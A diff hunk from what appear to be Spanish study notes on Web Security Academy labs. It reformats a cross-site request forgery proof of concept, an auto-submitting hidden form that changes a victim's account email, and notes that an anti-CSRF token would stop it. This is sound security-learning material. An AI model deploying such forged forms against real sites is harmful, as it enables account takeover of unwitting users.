@@ -2157,10 +2157,11 @@ Idea ==> construir HTML que al hacer click, realice una petición a ese endpoint
 
 ```html
 <form method="POST" action="https://<host>.net/my-account/change-email"> 
-    <input type="hidden" name="email" value="anything@web-security-academy.net"> </form> 
+    <input type="hidden" name="email" value="anything@web-security-academy.net">
+</form> 
 <script> 
        document.forms[0].submit(); 
-</script>`
+</script>
 ```
 
 ⚠️ Si hubiese token anti-csrf no se podría hacer esto porque no sabríamos el token de la víctima.
